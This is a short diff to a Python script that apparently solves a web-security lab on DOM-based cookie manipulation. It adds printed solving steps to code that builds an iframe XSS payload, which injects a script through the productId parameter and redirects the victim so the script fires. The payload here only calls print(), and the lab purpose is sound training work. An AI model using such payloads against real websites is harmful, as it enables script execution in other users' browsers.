@@ -1,11 +1,15 @@
 import requests
 import urllib3
+from colorama import Fore
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 LAB_NAME = "DOM-based cookie manipulation"
 
 def run(url, payload, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Craft an iframe with the XSS payload in its src attribute and make its onload handler redirect the victim to the main page, triggering the XSS payload\n2. Deliver the exploit to the victim\n""")
+
     response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
     url = url.rstrip('/')
     payload = f"""<iframe src="{url}/product?productId=1&'><script>print()</script>"  onload="if(!window.x)this.src='{url}';window.x=1;">"""
